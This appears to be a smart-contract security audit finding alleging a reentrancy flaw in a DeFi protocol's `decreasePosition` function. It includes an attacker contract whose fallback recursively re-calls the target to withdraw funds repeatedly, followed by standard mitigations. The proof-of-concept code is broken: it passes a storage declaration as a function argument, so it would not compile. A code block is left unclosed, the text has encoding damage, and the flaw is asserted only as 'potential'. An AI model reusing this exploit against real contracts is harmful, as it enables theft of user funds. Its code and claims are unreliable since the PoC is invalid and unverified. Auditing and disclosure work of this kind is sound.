# `decreasePosition` function is vulnerable to reentrancy attacks

# decreasePosition function is vulnerable to reentrancy attacks

## Summary
The decreasePosition function potentially contains a reentrancy vulnerability due to the external calls made to VaultProcess.transferOut within `_settleCrossAccount` and `_settleIsolateAccount`. These calls can transfer tokens out to an external address which could be a contract designed to reenter the decreasePosition function.



## Vulnerability Detail
- External calls to `VaultProcess.transferOut` in `_settleCrossAccount` and `_settleIsolateAccount` are made before the state changes are completed.
- This opens up the possibility of a reentrant call where the attacker could reenter the `decreasePosition` function and perform malicious actions, such as withdrawing funds multiple times.
## Proof of Concept (PoC):
An attacker can use a reentrancy attack to call `decreasePosition` recursively before the state variables are updated, causing inconsistencies and potential fund loss. Here's an example of how this attack could be structured:
```solidity
pragma solidity ^0.8.18;

import "DecreasePositionProcess.sol";

contract AttackContract {
    DecreasePositionProcess public target;
    uint256 public amount;
    address public owner;

    constructor(address _target) {
        target = DecreasePositionProcess(_target);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only owner can initiate the attack");

        // Initialize the attack by calling decreasePosition
        target.decreasePosition(
            // Pass appropriate parameters to match DecreasePositionParams structure
            Position.Props storage position,
            DecreasePositionProcess.DecreasePositionParams({
                requestId: 1,
                symbol: keccak256(abi.encodePacked("ETH/USD")),
                isLiquidation: false,
                isCrossMargin: false,
                marginToken: address(this),
                decreaseQty: 1 ether,
                executePrice: 2000 ether
            })
        );
    }

    // Fallback function to execute during reentrancy
    fallback() external payable {
        if (amount < 10 ether) {
            amount += 1 ether;

            // Recursively call decreasePosition to exploit the reentrancy vulnerability
            target.decreasePosition(
                Position.Props storage position,
                DecreasePositionProcess.DecreasePositionParams({
                    requestId: 1,
                    symbol: keccak256(abi.encodePacked("ETH/USD")),
                    isLiquidation: false,
                    isCrossMargin: false,
                    marginToken: address(this),
                    decreaseQty: 1 ether,
                    executePrice: 2000 ether
                })
            );
        }
    }
}

```

## Impact
Mishandling of liabilities could lead to incorrect calculations or inconsistencies in the contract state, potentially impacting user funds or contract functionality.

## Code Snippet
```solidity
function decreasePosition(Position.Props storage position, DecreasePositionParams calldata params) external {
    ...
    if (params.decreaseQty == position.qty) {
        accountProps.delPosition(
            Position.getPositionKey(position.account, position.symbol, position.marginToken, position.isCrossMargin)
        );
        position.reset();
    } else {
        ...
        position.lastUpdateTime = ChainUtils.currentTimestamp();
    }
    ...
}

## Tool used
Vs code
Manual Review

## Recommendation
- Use the Checks-Effects-Interactions Pattern:
Ensure that all state changes are made before any external calls. This prevents the contract state from being manipulated during external calls.

- Implement Reentrancy Guards:
Use the nonReentrant modifier from OpenZeppelinâ€™s ReentrancyGuard to prevent reentrant calls.
